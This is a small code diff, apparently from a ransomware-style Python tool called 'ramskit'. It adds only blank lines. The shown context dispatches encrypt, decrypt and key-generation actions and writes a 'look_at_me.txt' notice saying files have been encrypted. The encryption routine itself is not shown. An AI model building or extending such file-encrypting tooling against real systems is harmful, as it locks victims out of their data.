@@ -109,6 +109,7 @@ if __name__ == '__main__':
                 Heyo, this file has been encrypted!. \n\n
             ''')
         ramskit.encrypt_file(items, key)
+    
     elif action == 'decrypt':
         if not os.path.exists(lam):
             print('No look_at_me.txt file found. Exiting...')
@@ -116,8 +117,10 @@ if __name__ == '__main__':
         os.remove(lam)
         items.remove(lam)
         ramskit.decrypt_file(items, key)
+    
     elif action == 'generate_key':
         print(Ramskit.generate_key())
+    
     else:
         raise Exception('Invalid action: ', action)
         sys.exit(1)
